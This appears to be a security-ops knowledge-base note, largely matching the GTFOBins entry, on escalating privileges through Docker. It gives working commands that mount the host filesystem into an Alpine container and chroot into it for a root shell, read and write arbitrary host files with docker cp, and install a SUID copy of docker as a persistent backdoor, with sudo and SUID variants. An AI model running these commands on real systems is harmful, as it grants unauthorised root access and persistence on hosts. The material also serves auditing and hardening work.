---
id: "doc-ac62dc98da35"
title: "docker 提权"
date: "2023-04-14T15:57:00"
categories: ["安全与堡垒机", "安全运维"]
tags: ["安全与堡垒机", "安全运维", "Linux", "Docker", "知识笔记"]
source: "03-安全运营与应急/07-工作运维离线知识库/04-安全运维/birdben/68652301.html"
---

# docker 提权

> GitHub 仓库源文件：[点击打开网页渲染版](https://github.com/ben2023niao/ben-ops-notes/blob/main/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%2BLinux%2BDocker-docker%20%E6%8F%90%E6%9D%83.md)

This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.

Any other Docker Linux image should work, e.g., `debian`.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

- The resulting is a root shell.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

- Write a file by copying it to a temporary container and back to the target destination on the host.

```bash
CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
echo "DATA" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

- Read a file by copying it to a temporary container and back to a new location on the host.

```bash
CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

- The resulting is a root shell.

```bash
sudo install -m =xs $(which docker) .

./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- The resulting is a root shell.

```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
